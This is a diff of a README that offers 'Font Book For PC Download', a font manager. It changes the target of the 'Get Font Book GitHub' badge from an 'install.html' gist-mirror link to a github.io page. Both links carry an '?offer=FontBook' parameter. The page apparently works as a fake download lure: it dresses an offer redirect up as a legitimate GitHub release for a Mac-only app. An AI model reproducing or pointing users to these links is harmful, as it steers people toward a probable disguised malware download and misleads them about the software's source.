@@ -1,6 +1,6 @@
 # Font Book For PC Download — Desktop Font Manager
 
-[![Get Font Book GitHub](https://img.shields.io/badge/Get%20Font%20Book%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/mistieensnik/9d373fc0a8b19001358db7c85d6daecf/raw/2250dcbc8b6965afcc83e4db9da3e25b5cad3b48/install.html?offer=FontBook)
+[![Get Font Book GitHub](https://img.shields.io/badge/Get%20Font%20Book%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=FontBook)
 
 ## 🎯 What You Get
 - ✅ 🔤 Preview and test fonts
